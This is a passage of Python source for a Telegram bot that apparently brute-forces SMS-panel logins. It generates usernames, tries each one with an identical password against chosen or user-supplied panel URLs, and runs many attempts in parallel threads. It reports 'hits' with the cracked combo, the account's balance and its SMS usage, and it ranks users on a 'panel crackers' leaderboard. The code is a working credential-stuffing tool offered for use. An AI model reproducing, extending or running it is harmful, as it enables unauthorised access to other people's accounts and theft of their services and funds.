    
    data = query.data
    session = user_sessions[user_id]
    
    if data == "cancel":
        session.state = None
        await query.edit_message_text(premium_emoji("❌ <b>Action Cancelled.</b>"), parse_mode="HTML")
        await start_callback(query)
        return
    
    if data == "stop_all":
        session.state = None
        if session.running:
            session.running = False
            await query.edit_message_text(premium_emoji("🛑 <b>Your processing has been stopped.</b>\nPlease wait for the current checks to finish."), parse_mode="HTML")
        else:
            await query.edit_message_text(premium_emoji("📭 <b>No active process running.</b>"), parse_mode="HTML")
            await start_callback(query)
        return
    
    if data == "show_stats":
        admin_link = '<a href="https://t.me/Asifsakhani786">ASIF SAKHANI</a>'
        stats_text = premium_emoji(f"""
📊 <b>Your Session Stats</b>
━━━━━━━━━━━━━━━━━━
📋 <b>Total Panels:</b> {len(PANELS)}
📊 <b>Selected Count:</b> {session.count}
✅ <b>Total Valid Found:</b> {session.stats['valid']}
❌ <b>Total Invalid:</b> {session.stats['invalid']}
📦 <b>Total Processed:</b> {session.stats['total']}
━━━━━━━━━━━━━━━━━━
💡 <b>Develop by:</b> {admin_link}""")
        await query.edit_message_text(stats_text, parse_mode="HTML", disable_web_page_preview=True)
        return

    if data == "top_rank":
        lb = load_leaderboard()
        if not lb:
            await query.edit_message_text(premium_emoji("📭 <b>Leaderboard is empty!</b>\n\nReturning to menu..."), parse_mode="HTML")
            await asyncio.sleep(2)
            await start_callback(query)
            return
        sorted_lb = sorted(lb.values(), key=lambda x: x["hits"], reverse=True)
        text = premium_emoji("🏆 <b>TOP PANEL CRACKERS</b> 🏆\n━━━━━━━━━━━━━━━━━━\n")
        medals = ["🥇", "🥈", "🥉"]
        for i, user in enumerate(sorted_lb[:10]):
            rank = medals[i] if i < 3 else f"#{i+1}"
            text += f"{rank} <b>{user['name']}</b> ➾ {user['hits']} Hits\n"
        text += "━━━━━━━━━━━━━━━━━━\n💡 <b>Develop by:</b> <a href='https://t.me/Asifsakhani786'>ASIF SAKHANI</a>"
        keyboard = [[btn("🔙 BACK TO MENU", "cancel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML", disable_web_page_preview=True)
        return
    
    if data == "gennam_yes":
        keyboard, row = [], []
        for key, panel in PANELS.items():
            row.append(btn(f"{panel['icon']} {panel['name']}", f"panel_{key}"))
            if len(row) == 2:
                keyboard.append(row)
                row = []
        if row: keyboard.append(row)
        keyboard.append([btn("🆕 CHECK NEW URL", "gennam_new_url")]) 
        keyboard.append([btn("🚫 CANCEL", "cancel")])
        await query.edit_message_text(premium_emoji("📋 <b>Great! Select a Saved Panel OR provide a New URL:</b>"), reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
        return

    if data == "gennam_new_url":
        session.state = "WAITING_GENNAM_NEW_URL"
        await query.edit_message_text(premium_emoji("🔗 <b>Send the New Panel URL:</b>\n\nExample: <code>http://example.com/ints/login</code>"), parse_mode="HTML")
        return
    
    if data == "panel_select":
        keyboard, row = [], []
        for key, panel in PANELS.items():
            row.append(btn(f"{panel['icon']} {panel['name']}", f"panel_{key}"))
            if len(row) == 2:
                keyboard.append(row)
                row = []
        if row: keyboard.append(row)
        keyboard.append([btn("🚫 CANCEL", "cancel")])
        await query.edit_message_text(premium_emoji("📋 <b>Select a Panel:</b>"), reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
        return
    
    if data.startswith("panel_"):
        panel_key = data.replace("panel_", "")
        if panel_key not in PANELS: return
        session.current_panel_config = PANELS[panel_key]
        keyboard = [[btn("👑 AGENT ONLY", f"role_Agent")], [btn("👤 CLIENT ONLY", f"role_Client")], [btn("🔄 MIX BOTH", f"role_Mix")], [btn("🚫 CANCEL", "cancel")]]
        await query.edit_message_text(premium_emoji(f"🎯 <b>Panel Selected:</b> {PANELS[panel_key]['name']}\n\n👇 <b>Select Account Type:</b>"), reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
        return

    if data.startswith("role_"):
        role_choice = data.replace("role_", "")
        session.target_role = role_choice
        session.results = []
        session.stats = {"total": 0, "valid": 0, "invalid": 0}
        panel = session.current_panel_config
        if not panel: return
        
        confirm_text = premium_emoji(f"""
✅ <b>Ready to Start</b>
━━━━━━━━━━━━━━━━━━
{panel['icon']} <b>Target:</b> {panel['name']}
📊 <b>Combos:</b> {session.count}
🎯 <b>Type:</b> {role_choice}
━━━━━━━━━━━━━━━━━━
🔄 <b>Starting Engine...</b>""")
        await query.edit_message_text(confirm_text, parse_mode="HTML")
        asyncio.create_task(run_checker(user_id, query.message))

async def run_checker(user_id, message):
    session = user_sessions.get(user_id)
    if not session or not session.current_panel_config: return
    if session.running: return
    
    session.running = True
    session.start_time = time.time()
    
    panel_config = session.current_panel_config
    panel_name, panel_icon = panel_config["name"], panel_config["icon"]
    admin_link = '<a href="https://t.me/Asifsakhani786">ASIF SAKHANI</a>'
    
    if session.custom_names:
        combos = session.custom_names
        session.custom_names = [] # Clear memory
    else:
        combos = generate_all_usernames(session.count)
        
    total = len(combos)
    session.stats["total"] = total
    
    valid_results = []
    processed = 0
    last_edit_time = time.time()
    
    status_msg = await message.edit_text(premium_emoji(f"""
🚀 <b>SYSTEM INITIALIZING...</b>
━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target Panel:</b> {panel_name} {panel_icon}
⚙️ <b>Filter Mode:</b> {session.target_role}

📦 <b>Total Combos:</b> {total}
🔄 <b>Progress:</b> [⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜] 0%

✅ <b>Live:</b> 0  |  ❌ <b>Dead:</b> 0
⏱️ <b>Time Elapsed:</b> 0s
━━━━━━━━━━━━━━━━━━━━
⏳ <i>Scanning in progress... send /stop to abort.</i>"""), parse_mode="HTML")
    
    loop = asyncio.get_running_loop()
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        # Puraani sync block execution ko theek karne ke liye loop.run_in_executor ka istemaal kiya hai
        tasks = [loop.run_in_executor(pool, check_credential, u, u, panel_config) for u in combos]
        
        for coro in asyncio.as_completed(tasks):
            if not session.running: break
                
            try:
                result = await coro
            except:
                result = None
                
            processed += 1
            
            if result:
                username, password, role, stats = result
                if session.target_role == "Agent" and role != "Agent": session.stats["invalid"] += 1
                elif session.target_role == "Client" and role != "Client": session.stats["invalid"] += 1
                else:
                    valid_results.append((username, password, role, stats))
                    session.results.append(result)
                    session.stats["valid"] += 1
                    
                    gif_url = get_next_gif()
                    login_url = panel_config.get("login_url", "")
                    
                    live_msg = f"""
<blockquote><b>✅ NEW HIT FOUND — {panel_name}</b></blockquote>
<b>💳 Combo:</b> <code>{username}:{password}</code>
<b>🛒 Role:</b> {role}
<b>💰 Balance:</b> {stats.get('balance', 0)}
<b>📊 SMS Today:</b> {stats.get('today', 0)}
<b>🔗 URL:</b> <a href="{login_url}">Login Here</a>
—
<i>Develop by ASIF SAKHANI 👑</i>
"""
                    try:
                        await asyncio.sleep(1) # Delay lagaya hai Telegram floodwait se bachne ke liye
                        await message.reply_animation(animation=gif_url, caption=live_msg, parse_mode="HTML")
                    except Exception as e:
                        # Fallback option agar reply_animation network error ki wajah se fail ho
                        try:
                            fallback_msg = f"<a href='{gif_url}'>&#8205;</a>\n" + live_msg
                            await message.reply_text(text=fallback_msg, parse_mode="HTML")
                        except: pass
            else:
                session.stats["invalid"] += 1
            
            current_time = time.time()
            elapsed = int(current_time - session.start_time)
            
            if current_time - last_edit_time >= 4.0 or processed == total:
                last_edit_time = current_time
                percent = int((processed / total) * 100)
                filled = int((processed / total) * 10)
                bar = "🟩" * filled + "⬜" * (10 - filled)
                
                progress_text = premium_emoji(f"""
⚡ <b>CHECKER IN PROGRESS...</b>
━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target Panel:</b> {panel_name} {panel_icon}
⚙️ <b>Filter Mode:</b> {session.target_role}

📦 <b>Total Combos:</b> {total}
🔄 <b>Progress:</b> [{bar}] {percent}%

✅ <b>Live:</b> {session.stats['valid']}  |  ❌ <b>Dead:</b> {session.stats['invalid']}
⏱️ <b>Time Elapsed:</b> {elapsed}s
━━━━━━━━━━━━━━━━━━━━
⏳ <i>Scanning in progress... send /stop to abort.</i>""")
                try: await status_msg.edit_text(progress_text, parse_mode="HTML")
                except: pass

    session.running = False
    elapsed = int(time.time() - session.start_time)
    
    if session.stats["valid"] > 0: update_leaderboard(user_id, session.first_name, session.stats["valid"])

    if valid_results:
        final_text = premium_emoji(f"""
✅ <b>Check Complete!</b> 🎉
━━━━━━━━━━━━━━━━━━
{panel_icon} <b>Panel:</b> {panel_name}
🎯 <b>Filter:</b> {session.target_role}
✅ <b>Total Valid:</b> {session.stats['valid']}
❌ <b>Total Invalid:</b> {session.stats['invalid']}
📦 <b>Total Checked:</b> {processed}
⏱️ <b>Total Time:</b> {elapsed}s
━━━━━━━━━━━━━━━━━━
💡 <b>Develop by:</b> {admin_link}""")
        await status_msg.edit_text(final_text, parse_mode="HTML")

    else:
        await status_msg.edit_text(premium_emoji(f"""
❌ <b>No Valid Credentials Found!</b>
━━━━━━━━━━━━━━━━━━
{panel_icon} <b>Panel:</b> {panel_name}
🎯 <b>Filter:</b> {session.target_role}
❌ <b>Valid:</b> 0
📦 <b>Total Checked:</b> {processed}
⏱️ <b>Time:</b> {elapsed}s
━━━━━━━━━━━━━━━━━━
💡 <b>Develop by:</b> {admin_link}"""), parse_mode="HTML", disable_web_page_preview=True)

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("id", id_command))
    app.add_handler(CommandHandler("add", add_user_command))
    app.add_handler(CommandHandler("addpanel", addpanel_command))
    app.add_handler(CommandHandler("new", new_command))
    app.add_handler(CommandHandler("gennam", gennam_command))
    app.add_handler(CommandHandler("top", top_command))
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("panel", panel_command))
    app.add_handler(CommandHandler("count", count_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.run_polling()

if __name__ == "__main__":
    main()
